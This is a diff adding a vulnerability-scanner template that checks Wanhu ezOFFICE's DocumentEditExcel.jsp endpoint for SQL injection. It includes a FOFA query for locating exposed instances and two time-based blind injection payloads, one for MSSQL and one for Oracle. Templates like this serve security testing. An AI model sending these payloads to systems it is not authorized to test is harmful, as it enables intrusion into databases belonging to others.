@@ -1,0 +1,37 @@
+id: wanhu-ezoffice-documenteditexcel-sqli
+
+info:
+  name: 万户documenteditexcel接口存在SQL注入
+  author: xiuxin
+  severity: high
+  tags: wanhu,ezoffice,,sqli
+  metadata: 
+    fofa-query: app="万户网络-ezOFFICE"
+    verified: true
+    max-request: 2
+
+http:
+  - raw:
+      - |
+       @timeout: 15s
+        GET /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp;?RecordID=1%27%20WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: mssql
+        dsl:
+          - "status_code == 200 && duration>=3 && duration<=10"
+
+
+  - raw:
+      - |
+        @timeout: 15s
+        GET /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp;?RecordID=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: oracle
+        dsl:
+          - "status_code == 200 && duration>=3 && duration<=10"
